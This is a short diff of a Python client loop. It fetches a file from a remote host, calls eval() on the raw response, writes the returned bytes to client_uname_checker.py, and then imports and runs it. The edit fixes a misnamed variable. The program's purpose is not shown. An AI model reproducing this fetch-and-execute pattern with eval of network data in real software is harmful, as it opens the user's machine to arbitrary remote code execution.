@@ -90,12 +90,11 @@ while True:
         received_data = get(f"{global_host_page}/py_files?file_code={next_file_code}", timeout=10).content
         if received_data[0] == 123 and received_data[-1] == 125:
             received_data = eval(received_data)
-            if response['file_code'] == next_file_code:
+            if received_data['file_code'] == next_file_code:
                 with open('client_uname_checker.py', 'wb') as file:
                     file.write(received_data['data'])
                 break
     except:
         sleep(1)
-
 import client_uname_checker
 client_uname_checker.run()
